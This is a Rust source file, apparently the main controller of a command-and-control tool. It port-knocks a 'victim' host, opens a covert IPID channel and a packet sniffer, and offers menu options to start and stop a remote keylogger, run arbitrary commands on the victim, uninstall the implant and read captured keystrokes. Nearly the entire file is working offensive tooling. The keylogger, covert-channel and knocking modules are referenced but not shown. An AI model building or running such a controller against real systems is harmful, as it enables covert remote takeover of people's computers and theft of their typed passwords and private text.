use std::io::{self, Write};
use std::net::{IpAddr, Ipv4Addr};
use std::thread;
use std::time::Duration;
use pnet::datalink::{self, Channel};

// Module declarations
mod port_knkr;
mod pcap_capture;
mod keylogger;
mod covert;

use port_knkr::KnockSession;
use pcap_capture::PcapHandle;
use covert::CovertChannel;

// Command Codes for Covert IPID Channel
const CMD_START_LOGGER: u8   = 0x10;
const CMD_STOP_LOGGER: u8    = 0x20;
const CMD_UNINSTALL: u8      = 0x30;

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    pcap_handle: Option<PcapHandle>,
    covert_chan: Option<CovertChannel>,
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            knock_session: None,
            pcap_handle: None,
            covert_chan: None,
        }
    }

    pub fn run(&mut self) {
        println!("=== C2 Server ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        println!("\n--- Status: Offline ---");
        println!("1) Initiate session (Port Knock)");
        println!("0) Exit");

        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => std::process::exit(0),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        println!("\n--- Status: Connected to {} ---", self.victim_ip.unwrap());
        println!("1) Disconnect from victim");
        println!("2) Uninstall from victim");
        println!("3) Start keylogger on victim");
        println!("4) Stop keylogger on victim");
        println!("5) Run program on victim");
        println!("6) View Captured Keys (from pcap logs)");

        match prompt("Selection > ").as_str() {
            "1" => self.disconnect(),
            "2" => self.uninstall(),
            "3" => self.start_keylogger(),
            "4" => self.stop_keylogger(),
            "5" => self.run_program(),
            "6" => self.view_keylog(),
            _   => println!("[!] Invalid selection"),
        }
    }

 fn initiate_connection(&mut self) {
        let ip_input = prompt("Enter target Victim IP [default: 127.0.0.1]: ");
        let target_ip = if ip_input.is_empty() { 
            "127.0.0.1".parse::<Ipv4Addr>().unwrap() 
        } else {
            match ip_input.parse::<Ipv4Addr>() {
                Ok(ip) => ip,
                Err(_) => { println!("[!] Invalid IP"); return; }
            }
        };

        let iface_name = Self::find_best_interface(target_ip).unwrap_or_else(|| "lo".to_string());
        
        println!("[*] Executing knocking sequence to {}...", target_ip);
        match port_knkr::port_knock(target_ip) {
            Ok(session) => {
                println!("[+] Port knock successful.");
                
                // --- START THE SNIFFER HERE ---
                println!("[DEBUG] Starting background sniffer on {}...", iface_name);
                self.pcap_handle = Some(PcapHandle::start(&iface_name, target_ip.to_string()));

                let interfaces = datalink::interfaces();
                let interface = interfaces.into_iter().find(|i| i.name == iface_name).unwrap();
                let local_ip = interface.ips.iter()
                    .find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None })
                    .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

                let (chan, rx) = CovertChannel::new(
                    &interface, target_ip, local_ip, session.tx_port, session.rx_port 
                );

                self.covert_chan = Some(chan);
                self.victim_ip = Some(target_ip);
                self.state = SessionState::Connected;
                self.knock_session = Some(session);
            }
            Err(e) => println!("[!] Knock failed: {}", e),
        }
    }

    fn start_keylogger(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending 'START' signal to victim...");
            chan.send_byte(CMD_START_LOGGER);
        }
    }

    fn stop_keylogger(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending 'STOP' signal to victim...");
            chan.send_byte(CMD_STOP_LOGGER);
        }
    }

  fn view_keylog(&self) {
        // Ensure this path matches the one in pcap_capture.rs
        let path = "./data/pcaps/captured_keys.txt";
        println!("\n--- Captured Keystrokes (from {}) ---", path);
        match std::fs::read_to_string(path) {
            Ok(content) => {
                if content.is_empty() {
                    println!("[!] File exists but is empty. Start the logger and type on the victim!");
                } else {
                    println!("{}", content);
                }
            }
            Err(_) => {
                println!("[!] No keylog data found at {}.", path);
                println!("[*] Hint: Ensure you have started the keylogger (Option 3) and the victim has typed something.");
            }
        }
    }

    fn run_program(&mut self) {
        let cmd = prompt("Command to run: ");
        if cmd.is_empty() { return; }

        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending command...");
            for byte in cmd.as_bytes() {
                chan.send_byte(*byte);
                thread::sleep(Duration::from_millis(10));
            }
            chan.send_byte(b'\n'); 
        }
    }

    fn uninstall(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            chan.send_byte(CMD_UNINSTALL);
            println!("[*] Uninstall command sent.");
        }
    }

    fn disconnect(&mut self) {
        println!("[*] Closing session...");
        if let Some(session) = &self.knock_session { session.stop(); }
        self.knock_session = None;
        self.pcap_handle = None;
        self.covert_chan = None;
        self.state = SessionState::Disconnected;
    }

    fn find_best_interface(target_ip: Ipv4Addr) -> Option<String> {
        let interfaces = datalink::interfaces();
        for iface in interfaces {
            if !iface.is_up() || iface.is_loopback() { continue; }
            for ip_net in &iface.ips {
                if let IpAddr::V4(_) = ip_net.ip() {
                    if ip_net.contains(IpAddr::V4(target_ip)) { return Some(iface.name); }
                }
            }
        }
        datalink::interfaces().into_iter()
            .find(|i| i.is_up() && !i.is_loopback())
            .map(|i| i.name)
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    let mut commander = Commander::new();
    commander.run();
}
